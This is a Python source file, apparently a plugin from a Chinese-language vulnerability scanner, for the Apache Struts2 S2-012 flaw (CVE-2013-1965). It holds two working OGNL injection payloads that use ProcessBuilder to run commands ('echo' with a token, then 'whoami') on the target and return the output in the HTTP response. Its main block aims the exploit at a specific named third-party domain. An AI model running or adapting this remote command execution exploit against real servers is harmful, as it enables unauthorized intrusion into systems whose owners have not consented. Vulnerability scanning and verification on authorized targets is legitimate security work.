
#!/usr/bin/env python3

'''
name: S2-012漏洞,又名CVE-2013-1965漏洞
description: S2-012漏洞可执行任意命令
'''
import sys
import time
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_012_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.check_payload =  '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + '"echo",' + '\"' + self.capta + '\"' + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
        self.cmd_payload =  '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
        self.check_data = {'name': self.check_payload}    
        self.cmd_data = {'name': self.cmd_payload} 

    def filter(self, check_str):
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp                                 

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            if  '.action' not in self.url:
                self.url = self.url + '/user.action'
            check_res = request.post(self.url, data = self.check_data)
            check_str = self.filter(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                cmd_res = request.post(self.url, data = self.cmd_data)
                cmd_str = self.filter(list(cmd_res.text))
                print ('存在S2-012漏洞,执行whoami命令成功，执行结果是:', cmd_str)
                return True
            else:
                #print('不存在S2-012漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass
       

if  __name__ == "__main__":
    S2_012 = S2_012_BaseVerify('http://jsfw.kydls.com')
    S2_012.run()